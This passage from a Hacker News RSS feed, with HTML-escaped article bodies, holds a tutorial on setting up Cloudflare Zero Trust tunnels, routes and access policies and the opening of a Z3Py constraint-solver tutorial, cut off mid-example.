      &lt;item&gt;&lt;p&gt;If you’ve ever tried to ask ChatGPT to DM for you, you’ll have experienced this first-hand: the model will immediately try and show you something cool, skipping over the necessary dullness that builds tension and lends verisimilitude.&lt;/p&gt;↩&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you liked this post, consider subscribing to email updates about my new posts, or sharing it on Hacker News. Here's a preview of a related post that shares tags with this one.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Writing for AIs is a good way to reach more humans&lt;/p&gt;&lt;p&gt;There’s an idea going around right now about “writing for AIs”: writing as if your primary audience is not human readers, but the language models that will be trained on the content of your posts. Why would anyone do this? For the same reason you might want to go on podcasts or engage in SEO: to get your core ideas in front of many more people than would read your posts directly.&lt;/p&gt;&lt;lb/&gt;Continue reading...&lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45946498</guid><pubDate>Sun, 16 Nov 2025 16:56:47 +0000</pubDate></item><item><title>I finally understand Cloudflare Zero Trust tunnels</title><link>https://david.coffee/cloudflare-zero-trust-tunnels</link><description>&lt;doc fingerprint="a5b8a71e23286293"&gt;
  &lt;main&gt;
    &lt;p&gt;A while ago, after frustration with Tailscale in environments where it couldn’t properly penetrate NAT/firewall and get a p2p connection, I decided to invest some time into learning something new: Cloudflare Zero Trust + Warp.&lt;/p&gt;
    &lt;p&gt;There are so many new concepts, but after way too long, I can finally say that I understand Cloudflare Zero Trust Warp now. I am a full-on Cloudflare Zero Trust with Warp convert, and while I still have Tailscale running in parallel, almost everything I do now is going through Zero Trust tunnels.&lt;/p&gt;
    &lt;p&gt;This post is an explanation of the basic concepts, because I’m sure others will have similar issues wrapping their head around it.&lt;/p&gt;
    &lt;head rend="h4"&gt;Why tho?&lt;/head&gt;
    &lt;p&gt;Why would you even sink so much time into learning this? What does it give you?&lt;/p&gt;
    &lt;p&gt;Argo tunnels through Zero Trust allow you to do a bunch of really cool things:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Connect private networks together - can be home networks, can be kubernetes clusters, you can create tunnels to and from every infra&lt;/item&gt;
      &lt;item&gt;Expose private services to the public, on public hostnames, no matter where they are running. You could even put your router running at 192.168.1.1 on the internet, accessible to everyone, no Warp client required&lt;/item&gt;
      &lt;item&gt;Create fully private networks with private IPs (10.x.x.x) that only resolve when Warp is connected, to services you specify&lt;/item&gt;
      &lt;item&gt;Quickly expose a public route to any service running locally or on any server, for quick development, testing webhooks or giving coworkers a quick preview&lt;/item&gt;
      &lt;item&gt;Create a fully private network running at home that’s only available when you’re connected to the Warp VPN client, or only to you, reachable anywhere&lt;/item&gt;
      &lt;item&gt;No worries about NAT, everything goes through the Cloudflare network, no direct p2p connection required&lt;/item&gt;
      &lt;item&gt;Add very granular access policies on who can access what - what login method does the user need, which email addresses are allowed. Allow bots and server-to-server exceptions with service access tokens.&lt;list rend="ul"&gt;&lt;item&gt;Does the user need to have Warp running? Does he need to be enrolled in Zero Trust? Does he need some special permission flag?&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Authenticate to SSH servers through Zero Trust access policies without the need of SSH keys. Just connect Warp, type &lt;code&gt;ssh host&lt;/code&gt;and you’re logged in&lt;list rend="ul"&gt;&lt;item&gt;Close public SSH ports completely to only allow login through Warp&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Get the benefits of Cloudflare VPN edge routing on top (similar to 1.1.1.1 Warp+)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Quickie: Cloudflare Zero Trust vs Tailscale&lt;/head&gt;
    &lt;p&gt;To get this out of the way:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tailscale: peer-to-peer, uses NAT and firewall penetration methods to establish p2p connections. If not possible, it goes through central relay servers. Absolute best speed and latency if a connection is established.&lt;/item&gt;
      &lt;item&gt;Cloudflare: All traffic (with the exception of warp-to-warp routing, which is p2p) goes through Cloudflare’s edge network. So even SSH-ing into your local router will hop through Cloudflare servers. This adds latency, but no issues with NAT at all.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Cloudflared != Warp&lt;/head&gt;
    &lt;p&gt;Cloudflare has 2 tools available: Warp Client and Cloudflared. They interact with each other and have similarities in some areas but are not the same.&lt;/p&gt;
    &lt;p&gt;Warp Client&lt;/p&gt;
    &lt;p&gt;The tool that connects you to the Cloudflare network. This is the thing that you configure to add clients into your Zero Trust network and enforces policies.&lt;/p&gt;
    &lt;p&gt;Usually this runs on clients, but can also run on servers.&lt;/p&gt;
    &lt;p&gt;Warp client also supports warp-to-warp routing which is a true p2p connection similar to Tailscale.&lt;/p&gt;
    &lt;p&gt;Cloudflared&lt;/p&gt;
    &lt;p&gt;The thing that creates a tunnel and adds it to the Zero Trust network.&lt;/p&gt;
    &lt;p&gt;Most commonly you run this on servers to expose tunnels into your network, but you can also run it on clients.&lt;/p&gt;
    &lt;p&gt;On the client side you can use &lt;code&gt;cloudflared access&lt;/code&gt; to establish a connection with other things in your Zero Trust network.&lt;/p&gt;
    &lt;p&gt;Can also create one-time-use tunnels that aren’t connected to the Zero Trust network. Good for testing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Tunnels, Routes, Targets&lt;/head&gt;
    &lt;p&gt;This took me the longest to understand. Zero Trust allows you to configure Tunnels, Routes and Targets; here’s how they interplay.&lt;/p&gt;
    &lt;head rend="h3"&gt;Tunnels&lt;/head&gt;
    &lt;p&gt;The most important part of your setup. Tunnels are deployed through &lt;code&gt;cloudflared&lt;/code&gt; and are simply an exit for traffic. Think of it as a literal tunnel that has its end somewhere.&lt;/p&gt;
    &lt;p&gt;Tunnels are deployed to infrastructure in the target network. So if you have a home network with 192.168.1.1/24, you want to deploy &lt;code&gt;cloudflared&lt;/code&gt; on any machine that’s always on and within that network. It can be your router, or your Raspi, it doesn’t matter.&lt;/p&gt;
    &lt;p&gt;For server-hosted services, you can have a tunnel on your main dev server, on a server, or on a pod in your Kubernetes cluster.&lt;/p&gt;
    &lt;p&gt;Now you have an opening into these networks through Warp/Argo tunnels.&lt;/p&gt;
    &lt;head rend="h4"&gt;Configuring tunnels&lt;/head&gt;
    &lt;p&gt;You can either configure tunnels through the Zero Trust UI by “adopting” them, or configure them in the &lt;code&gt;/etc/cloudflared/config.yml&lt;/code&gt; config on the machine itself. Personal preference, I usually configure them on the machine itself.&lt;/p&gt;
    &lt;p&gt;The config specifies where a request should get routed to when it arrives at the tunnel. So the tunnel knows what to do with it.&lt;/p&gt;
    &lt;p&gt;In this config we tell cloudflared to route traffic arriving at this tunnel for hostname &lt;code&gt;gitlab.widgetcorp.tech&lt;/code&gt; to localhost:80, and &lt;code&gt;gitlab-ssh&lt;/code&gt; to the local SSH server.&lt;/p&gt;
    &lt;code&gt;❯ cat /etc/cloudflared/config.yml
tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: gitlab.widgetcorp.tech
    service: http://localhost:80
  - hostname: gitlab-ssh.widgetcorp.tech
    service: ssh://localhost:22
  - service: http_status:404

  # Catch-all for WARP routing
  - service: http_status:404

warp-routing:
  enabled: true
&lt;/code&gt;
    &lt;p&gt;The config alone doesn’t do anything. It just exposes a tunnel, and that’s it. What we need now are routes and targets.&lt;/p&gt;
    &lt;head rend="h4"&gt;Exposing a private network to the public with tunnels quickly&lt;/head&gt;
    &lt;p&gt;Quick addition, as this is a super common use case. If you want to just expose something in your home network to the internet, you can add a config like this:&lt;/p&gt;
    &lt;code&gt;tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: homeassistant.mydomain.com
    service: http://192.168.1.3:80
&lt;/code&gt;
    &lt;p&gt;Then go into Cloudflare DNS settings and map the domain &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; to the tunnel:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;CNAME homeassistant.mydomain.com a2f17e27-cd4d-4fcd-b02a-63839f57a96f.cfargotunnel.com&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Now all traffic going to this domain will go through the cloudflared tunnel, which is configured to route &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; to &lt;code&gt;192.168.1.3&lt;/code&gt;. No Warp client needed, Argo tunnel does everything for us.&lt;/p&gt;
    &lt;p&gt;Note: If you adopted the tunnels and don’t use &lt;code&gt;config.yaml&lt;/code&gt;, you can automatically create matching DNS records in the Cloudflare UI and don’t need to do this manually.&lt;/p&gt;
    &lt;head rend="h3"&gt;Routes&lt;/head&gt;
    &lt;p&gt;A route defines where to direct traffic to.&lt;/p&gt;
    &lt;p&gt;Let’s say your homeassistant runs on 192.168.1.3 at home and you want to reach it from outside. Just above we deployed a &lt;code&gt;cloudflared&lt;/code&gt; tunnel on our router at 192.168.1.3, and added a config pointing the domain to the Argo tunnel, so &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; is already available to the public. However, &lt;code&gt;192.168.1.3&lt;/code&gt; isn’t, as it’s a private network IP.&lt;/p&gt;
    &lt;p&gt;You can define:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A route like &lt;code&gt;192.168.1.1/24&lt;/code&gt;pointing at your tunnel, to route ALL traffic to the full IP range through that tunnel (so even 192.168.1.245 will go through your tunnel)&lt;/item&gt;
      &lt;item&gt;Or a more specific route like &lt;code&gt;192.168.1.3/32&lt;/code&gt;pointing at your tunnel, to ONLY route traffic to 192.168.1.3 through that tunnel.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When configured, once your user connects their Warp client that’s set up with your Zero Trust network, the Warp client will see requests to 192.168.1.3 and route it through the Cloudflare network to reach your specific tunnel. Like a little police helper directing cars where to go.&lt;/p&gt;
    &lt;p&gt;If the Warp client is not connected, 192.168.1.3 will just resolve in your current local network. If connected, it will resolve to the tunnel.&lt;/p&gt;
    &lt;p&gt;The routed IP doesn’t need to exist! So you could, for example, route a random IP you like (e.g., 10.128.1.1) to your tunnel, the tunnel then forwards it based on your routes, for example to 192.168.1.1. This is extremely powerful because it allows you to build your own fully virtual network.&lt;/p&gt;
    &lt;p&gt;That’s all it does, what happens afterwards is up to the tunnel config that we created above. The tunnel decides where to point the incoming request to, whether that’s localhost or somewhere else.&lt;/p&gt;
    &lt;p&gt;To summarize, the &lt;code&gt;route&lt;/code&gt; tells the Warp client where to route traffic to.&lt;/p&gt;
    &lt;p&gt;Now we have 2 things working:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;- goes through a Cloudflare DNS record pointing at an Argo tunnel, which then forwards to 192.168.1.3. This works without Warp connected as it’s on the DNS level, public to everyone.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;192.168.1.3&lt;/code&gt;- The Warp client sees the request and routes it through the Argo tunnel, which then forwards it to&lt;code&gt;192.168.1.3&lt;/code&gt;within that network. This needs Warp connected to work, and is only visible to people in your Zero Trust org.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Targets&lt;/head&gt;
    &lt;p&gt;This one took me a while.&lt;/p&gt;
    &lt;p&gt;Targets are needed to define a piece of infrastructure that you want to protect through Zero Trust. They are like a pointer pointing to something in your network. This goes hand-in-hand with routes, but isn’t always needed.&lt;/p&gt;
    &lt;p&gt;Let’s say you have 192.168.1.3 (homeassistant) exposed through a Cloudflare tunnel. By default, anyone in your network that is part of your Zero Trust org and has Warp client installed can now access your homeassistant at 192.168.1.3.&lt;/p&gt;
    &lt;p&gt;We can change that with targets. For example, defining a target with hostname = &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; to the route &lt;code&gt;192.168.1.3/32&lt;/code&gt; allows us to add access policies to it. We can also put an entire network into the target by specifying &lt;code&gt;192.168.1.3/24&lt;/code&gt; to control access. This also works with virtual IPs like 10.128.1.1!&lt;/p&gt;
    &lt;p&gt;Targets alone won’t do anything, they just point to the service or network. “Hey, here is homeassistant”, or “hey, here is my home network”.&lt;/p&gt;
    &lt;head rend="h2"&gt;Access Policies: Protecting Who Can Access What&lt;/head&gt;
    &lt;p&gt;Continuing the example from above:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;we have a tunnel running on our home network that routes &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;to&lt;code&gt;192.168.1.3&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;we set up public DNS records to point &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;to the Argo tunnel in Cloudflare&lt;/item&gt;
      &lt;item&gt;we created a route &lt;code&gt;192.168.1.3&lt;/code&gt;to go through the same tunnel&lt;/item&gt;
      &lt;item&gt;we also created a target pointing to &lt;code&gt;192.168.1.3&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When users access either &lt;code&gt;192.168.1.3&lt;/code&gt; or &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;, the Warp client will route the request through the tunnel, which then forwards the request to 192.168.1.3. Homeassistant loads and everything is fine.&lt;/p&gt;
    &lt;p&gt;But do we want that?&lt;/p&gt;
    &lt;p&gt;Probably not.&lt;/p&gt;
    &lt;p&gt;Access policies to the rescue!&lt;/p&gt;
    &lt;p&gt;With access policies, we can leave things in the public but protect them with Cloudflare Zero Trust access. So while 192.168.1.3 is only available if Warp is connected (so routing to it works), we can add security to our public &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Go to Access -&amp;gt; Applications -&amp;gt; Add an Application -&amp;gt; Self-hosted.&lt;/p&gt;
    &lt;p&gt;Here we can define what should be protected, and how.&lt;/p&gt;
    &lt;p&gt;Going with our previous example, we can add a public hostname &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; or an IP like &lt;code&gt;192.168.1.3&lt;/code&gt; (or both), then attach policies of who should be able to access it.&lt;/p&gt;
    &lt;p&gt;You can specify Include (“OR”) and Require (“AND”) selectors.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Require rules must always be met, on top of include rules, to grant access&lt;/item&gt;
      &lt;item&gt;Any of the Include rules must match to grant access&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Then there are Actions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allow - when the policy matches, allow access&lt;/item&gt;
      &lt;item&gt;Deny - when the policy matches, deny access. aka blocking something.&lt;/item&gt;
      &lt;item&gt;Bypass - when the policy matches, bypass Zero Trust completely. No more checking.&lt;/item&gt;
      &lt;item&gt;Service Auth - when the policy matches, allow authentication to the service with a service token header (good for server-to-server, or bots). Check Access -&amp;gt; Service Auth to create these tokens.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Allow public access to everyone logging into your network&lt;/head&gt;
    &lt;p&gt;The most common use case: &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; is public. We want to keep it public, but add an extra layer of security.&lt;/p&gt;
    &lt;p&gt;Add an include policy, pick any of the &lt;code&gt;email&lt;/code&gt; selectors, add the email of the user you want to allow access to. Now only people authenticated with your Zero Trust org with the specified emails can access your homeassistant, without needing to have Warp running.&lt;/p&gt;
    &lt;p&gt;We can harden this by adding require rules: Add a Login Method selector rule, pick a specific login method like GitHub. Now only people with specific emails that have authenticated through GitHub can access your homeassistant, without needing to have Warp running.&lt;/p&gt;
    &lt;head rend="h3"&gt;Bypass login completely when connected through WARP&lt;/head&gt;
    &lt;p&gt;Another policy I like having is to skip the login screen entirely when connected through Warp. If a user is already enrolled into my Zero Trust org and has the Warp client provisioned, then there’s no need to ask them to authenticate again.&lt;/p&gt;
    &lt;p&gt;We can add a separate policy (don’t edit the one we just created above), pick the Gateway selector and set it to Allow or Bypass.&lt;/p&gt;
    &lt;p&gt;Don’t use ‘Warp’ - the Warp selector will match anyone that has Warp running, including the consumer 1.1.1.1 app. Gateway, on the other hand, matches only if someone is connecting through your Gateway, be that DNS or a provisioned Warp client.&lt;/p&gt;
    &lt;p&gt;(The ‘Gateway’ selector is only available if the Warp client is set to allow WARP authentication identity)&lt;/p&gt;
    &lt;p&gt;Now when:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Warp through Zero Trust is running on a machine: No login screen&lt;/item&gt;
      &lt;item&gt;No Warp running (public access): Prompt for login screen, but only allow specific emails that authenticated through GitHub&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This setup makes it very convenient to reach homeassistant, no matter if connected through Warp or not.&lt;/p&gt;
    &lt;head rend="h2"&gt;Deploying the Warp client and enrolling into Zero Trust&lt;/head&gt;
    &lt;p&gt;Are you still with me?&lt;/p&gt;
    &lt;p&gt;Our network is basically done. We have a login-protected &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt; that routes through our tunnel into our private network and terminates at &lt;code&gt;192.168.1.3&lt;/code&gt;, and we have a direct route to &lt;code&gt;192.168.1.3&lt;/code&gt; that only works when connected with Warp.&lt;/p&gt;
    &lt;p&gt;We also have login policies to make sure only specific users (logged in with GitHub and certain email addresses) can access homeassistant.&lt;/p&gt;
    &lt;p&gt;So how do we deploy the dang Warp client?&lt;/p&gt;
    &lt;p&gt;Actually the same: We create some policies.&lt;/p&gt;
    &lt;p&gt;Head to Settings -&amp;gt; Warp Client&lt;/p&gt;
    &lt;p&gt;In Enrollment Permissions, we specify the same policies for who can enroll. For example, “[email protected]” when authenticated through GitHub is allowed to enroll. In the Login Methods we can specify what login methods are available when someone tries to enroll into our Zero Trust org.&lt;/p&gt;
    &lt;p&gt;Toggle WARP authentication identity settings to make the Gateway selector available in policies, effectively allowing the configured WARP client to be used as a login method.&lt;/p&gt;
    &lt;p&gt;Careful here, once someone is enrolled, they are basically in your Zero Trust network through Warp. Make sure you harden this.&lt;/p&gt;
    &lt;p&gt;Then, in Profile settings, we define how the WARP client behaves. These are things like protocol: MASQUE or WireGuard, service mode, what IPs and domains to exclude from WARP routing (e.g., the local network should never go through WARP), setting it to exclude or include mode and so on.&lt;/p&gt;
    &lt;p&gt;Other settings I recommend setting:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install CA to system certificate store - installs the Cloudflare CA certificate automatically when enrolled.&lt;/item&gt;
      &lt;item&gt;Override local interface IP - assigns a unique CGNAT private IP to the client. This is needed for warp-to-warp routing.&lt;/item&gt;
      &lt;item&gt;Device Posture - what checks the WARP client should perform for the org. E.g., check the OS version, some OS files on disk, etc. I have this set to WARP and Gateway because I want the client to provide information on whether the user is connected through WARP and Gateway, for skipping certain login pages.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once done, just open the Warp client (https://developers.cloudflare.com/warp-client/), and log in to your network. This should open the login pages you specified in the Device Enrollment screen, and check all the enrollment policies you specified.&lt;/p&gt;
    &lt;p&gt;Once passed, congratulations, your WARP client is now connected to your Zero Trust network. The client will then go ahead and start routing &lt;code&gt;192.168.1.3&lt;/code&gt; through your tunnels, as specified in your tunnel and route settings.&lt;/p&gt;
    &lt;p&gt;🎉&lt;/p&gt;
    &lt;head rend="h2"&gt;What we built&lt;/head&gt;
    &lt;p&gt;If you followed this guide, here is what we built:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Login methods to connect the Warp client to your Zero Trust org through GitHub and specific email addresses&lt;/item&gt;
      &lt;item&gt;A tunnel within your private network that&lt;list rend="ul"&gt;&lt;item&gt;Forwards any request coming in with host &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;to&lt;code&gt;192.168.1.3&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Forwards any request coming in with host &lt;/item&gt;
      &lt;item&gt;A route that forwards all traffic for &lt;code&gt;192.168.1.3&lt;/code&gt;to the tunnel in your private network, which will terminate it at 192.168.1.3, which will only work when connected through Warp to route the request&lt;/item&gt;
      &lt;item&gt;A DNS name &lt;code&gt;homeassistant.mydomain.com&lt;/code&gt;that points to the Argo tunnel, and will allow everyone (even if not connected through Warp) to access homeassistant which runs at 192.168.1.3&lt;/item&gt;
      &lt;item&gt;Access policies that will&lt;list rend="ul"&gt;&lt;item&gt;Ask users that are not connected to Zero Trust through Warp to log in with GitHub and specific email, so everyone can access it if they can log in&lt;/item&gt;&lt;item&gt;A policy that skips the login screen completely and just shows homeassistant if the user connects through Zero Trust Warp client (enrolled into our org)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You don’t need the public domain and you don’t need the route to 192.168.1.3. These are 2 different options that you can use to expose homeassistant when you’re not at home. One is using a public domain name everyone can see, one is explicitly requiring connecting through enrolled Warp.&lt;/p&gt;
    &lt;p&gt;What I didn’t cover in this post:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Warp-to-warp routing&lt;/item&gt;
      &lt;item&gt;Creating and assigning fully private IPs that only exist within your Zero Trust network&lt;/item&gt;
      &lt;item&gt;SSH authentication through Zero Trust access policies (that’s what we need Targets for)&lt;/item&gt;
      &lt;item&gt;The other application types besides Self-Hosted&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I’m happy to expand on it if there’s interest. Let me know on X or Bluesky.&lt;/p&gt;
    &lt;p&gt;Happy tunneling! ⛅&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45946865</guid><pubDate>Sun, 16 Nov 2025 17:39:43 +0000</pubDate></item><item><title>The Man Who Keeps Predicting the Web's Death</title><link>https://tedium.co/2025/10/25/web-dead-predictions-george-colony/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45946937</guid><pubDate>Sun, 16 Nov 2025 17:50:29 +0000</pubDate></item><item><title>Z3 API in Python: From Sudoku to N-Queens in Under 20 Lines</title><link>https://ericpony.github.io/z3py-tutorial/guide-examples.htm</link><description>&lt;doc fingerprint="1f33dc5d2c218990"&gt;
  &lt;main&gt;
    &lt;p&gt;Z3 is a high performance theorem prover developed at Microsoft Research. Z3 is used in many applications such as: software/hardware verification and testing, constraint solving, analysis of hybrid systems, security, biology (in silico analysis), and geometrical problems.&lt;/p&gt;
    &lt;p&gt;This tutorial demonstrates the main capabilities of Z3Py: the Z3 API in Python. No Python background is needed to read this tutorial. However, it is useful to learn Python (a fun language!) at some point, and there are many excellent free resources for doing so (Python Tutorial).&lt;/p&gt;
    &lt;p&gt;The Z3 distribution also contains the C, .Net and OCaml APIs. The source code of Z3Py is available in the Z3 distribution, feel free to modify it to meet your needs. The source code also demonstrates how to use new features in Z3 4.0. Other cool front-ends for Z3 include Scala^Z3 and SBV.&lt;/p&gt;
    &lt;p&gt;Please send feedback, comments and/or corrections to leonardo@microsoft.com. Your comments are very valuable.&lt;/p&gt;
    &lt;p&gt;Let us start with the following simple example:&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
solve(x &amp;gt; 2, y &amp;lt; 10, x + 2*y == 7)
&lt;/code&gt;
    &lt;p&gt;The function Int('x') creates an integer variable in Z3 named x. The solve function solves a system of constraints. The example above uses two variables x and y, and three constraints. Z3Py like Python uses = for assignment. The operators &amp;lt;, &amp;lt;=, &amp;gt;, &amp;gt;=, == and != for comparison. In the example above, the expression x + 2*y == 7 is a Z3 constraint. Z3 can solve and crunch formulas.&lt;/p&gt;
    &lt;p&gt;The next examples show how to use the Z3 formula/expression simplifier.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
print (simplify(x + y + 2*x + 3))
print (simplify(x &amp;lt; y + x + 2))
print (simplify(And(x + 1 &amp;gt;= 3, x**2 + x**2 + y**2 + 2 &amp;gt;= 5)))
&lt;/code&gt;
    &lt;p&gt;By default, Z3Py (for the web) displays formulas and expressions using mathematical notation. As usual, ∧ is the logical and, ∨ is the logical or, and so on. The command set_option(html_mode=False) makes all formulas and expressions to be displayed in Z3Py notation. This is also the default mode for the offline version of Z3Py that comes with the Z3 distribution.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
print (x**2 + y**2 &amp;gt;= 1)
set_option(html_mode=False)
print (x**2 + y**2 &amp;gt;= 1)
&lt;/code&gt;
    &lt;p&gt;Z3 provides functions for traversing expressions.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
n = x + y &amp;gt;= 3
print ("num args: ", n.num_args())
print ("children: ", n.children())
print ("1st child:", n.arg(0))
print ("2nd child:", n.arg(1))
print ("operator: ", n.decl())
print ("op name:  ", n.decl().name())
&lt;/code&gt;
    &lt;p&gt;Z3 provides all basic mathematical operations. Z3Py uses the same operator precedence of the Python language. Like Python, ** is the power operator. Z3 can solve nonlinear polynomial constraints.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
y = Real('y')
solve(x**2 + y**2 &amp;gt; 3, x**3 + y &amp;lt; 5)
&lt;/code&gt;
    &lt;p&gt;The procedure Real('x') creates the real variable x. Z3Py can represent arbitrarily large integers, rational numbers (like in the example above), and irrational algebraic numbers. An irrational algebraic number is a root of a polynomial with integer coefficients. Internally, Z3 represents all these numbers precisely. The irrational numbers are displayed in decimal notation for making it easy to read the results.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
y = Real('y')
solve(x**2 + y**2 == 3, x**3 == 2)

set_option(precision=30)
print ("Solving, and displaying result with 30 decimal places")
solve(x**2 + y**2 == 3, x**3 == 2)
&lt;/code&gt;
    &lt;p&gt;The procedure set_option is used to configure the Z3 environment. It is used to set global configuration options such as how the result is displayed. The option set_option(precision=30) sets the number of decimal places used when displaying results. The ? mark in 1.2599210498? indicates the output is truncated.&lt;/p&gt;
    &lt;p&gt;The following example demonstrates a common mistake. The expression 3/2 is a Python integer and not a Z3 rational number. The example also shows different ways to create rational numbers in Z3Py. The procedure Q(num, den) creates a Z3 rational where num is the numerator and den is the denominator. The RealVal(1) creates a Z3 real number representing the number 1.&lt;/p&gt;
    &lt;code&gt;print (1/3)
print (RealVal(1)/3)
print (Q(1,3))

x = Real('x')
print (x + 1/3)
print (x + Q(1,3))
print (x + "1/3")
print (x + 0.25)
&lt;/code&gt;
    &lt;p&gt;Rational numbers can also be displayed in decimal notation.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
solve(3*x == 1)

set_option(rational_to_decimal=True)
solve(3*x == 1)

set_option(precision=30)
solve(3*x == 1)
&lt;/code&gt;
    &lt;p&gt;A system of constraints may not have a solution. In this case, we say the system is unsatisfiable.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
solve(x &amp;gt; 4, x &amp;lt; 0)
&lt;/code&gt;
    &lt;p&gt;Like in Python, comments begin with the hash character # and are terminated by the end of line. Z3Py does not support comments that span more than one line.&lt;/p&gt;
    &lt;code&gt;# This is a comment
x = Real('x') # comment: creating x
print (x**2 + 2*x + 2  # comment: printing polynomial)
&lt;/code&gt;
    &lt;p&gt;Z3 supports Boolean operators: And, Or, Not, Implies (implication), If (if-then-else). Bi-implications are represented using equality ==. The following example shows how to solve a simple set of Boolean constraints.&lt;/p&gt;
    &lt;code&gt;p = Bool('p')
q = Bool('q')
r = Bool('r')
solve(Implies(p, q), r == Not(q), Or(Not(p), r))

&lt;/code&gt;
    &lt;p&gt;The Python Boolean constants True and False can be used to build Z3 Boolean expressions.&lt;/p&gt;
    &lt;code&gt;p = Bool('p')
q = Bool('q')
print (And(p, q, True))
print (simplify(And(p, q, True)))
print (simplify(And(p, False)))
&lt;/code&gt;
    &lt;p&gt;The following example uses a combination of polynomial and Boolean constraints.&lt;/p&gt;
    &lt;code&gt;p = Bool('p')
x = Real('x')
solve(Or(x &amp;lt; 5, x &amp;gt; 10), Or(p, x**2 == 2), Not(p))
&lt;/code&gt;
    &lt;p&gt;Z3 provides different solvers. The command solve, used in the previous examples, is implemented using the Z3 solver API. The implementation can be found in the file z3.py in the Z3 distribution. The following example demonstrates the basic Solver API.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')

s = Solver()
print (s)

s.add(x &amp;gt; 10, y == x + 2)
print (s)
print ("Solving constraints in the solver s ...")
print (s.check())

print ("Create a new scope...")
s.push()
s.add(y &amp;lt; 11)
print (s)
print ("Solving updated set of constraints...")
print (s.check())

print ("Restoring state...")
s.pop()
print (s)
print ("Solving restored set of constraints...")
print (s.check())
&lt;/code&gt;
    &lt;p&gt;The command Solver() creates a general purpose solver. Constraints can be added using the method add. We say the constraints have been asserted in the solver. The method check() solves the asserted constraints. The result is sat (satisfiable) if a solution was found. The result is unsat (unsatisfiable) if no solution exists. We may also say the system of asserted constraints is infeasible. Finally, a solver may fail to solve a system of constraints and unknown is returned.&lt;/p&gt;
    &lt;p&gt;In some applications, we want to explore several similar problems that share several constraints. We can use the commands push and pop for doing that. Each solver maintains a stack of assertions. The command push creates a new scope by saving the current stack size. The command pop removes any assertion performed between it and the matching push. The check method always operates on the content of solver assertion stack.&lt;/p&gt;
    &lt;p&gt;The following example shows an example that Z3 cannot solve. The solver returns unknown in this case. Recall that Z3 can solve nonlinear polynomial constraints, but 2**x is not a polynomial.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
s = Solver()
s.add(2**x == 3)
print (s.check())
&lt;/code&gt;
    &lt;p&gt;The following example shows how to traverse the constraints asserted into a solver, and how to collect performance statistics for the check method.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
y = Real('y')
s = Solver()
